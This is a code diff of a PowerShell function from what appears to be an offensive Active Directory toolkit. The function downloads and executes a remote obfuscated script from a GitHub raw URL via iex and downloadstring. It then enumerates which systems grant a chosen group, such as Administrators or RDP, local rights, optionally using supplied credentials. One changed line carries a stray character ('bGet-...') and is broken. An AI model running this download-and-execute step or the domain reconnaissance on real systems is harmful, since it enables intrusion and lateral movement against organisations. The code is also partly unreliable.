@@ -770,7 +770,7 @@ function groupsearch
     #Enumeration Phase
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdev.ps1')
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/Pviewdev.ps1')
     $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'
             if ($user -eq "yes" -or $user -eq "y" -or $user -eq "Yes" -or $user -eq "Y")
             {
@@ -778,13 +778,13 @@ function groupsearch
                 $username = Get-Credential
                 $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                 Write-Host -ForegroundColor Yellow 'Searching...:'
-                bustling -n9gorCgPlTjDyXn $group -szvFVWkPJummdcf $username >> $currentPath\Groupsearches.txt
+                Get-DomainGPOUserLocalGroupMapping -LocalGroup $group -Credential $username >> $currentPath\Groupsearches.txt
             }
             else
             {
                 $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                 Write-Host -ForegroundColor Yellow 'Searching...:'
-                bustling -n9gorCgPlTjDyXn $group -WPxsp9KIBMFyVPQ >> $currentPath\Groupsearches.txt
+                bGet-DomainGPOUserLocalGroupMapping -LocalGroup $group -Identity $env:UserName >> $currentPath\Groupsearches.txt
                 Write-Host -ForegroundColor Yellow "Systems saved to >> $currentPath\Groupsearches.txt:"
             }
 }
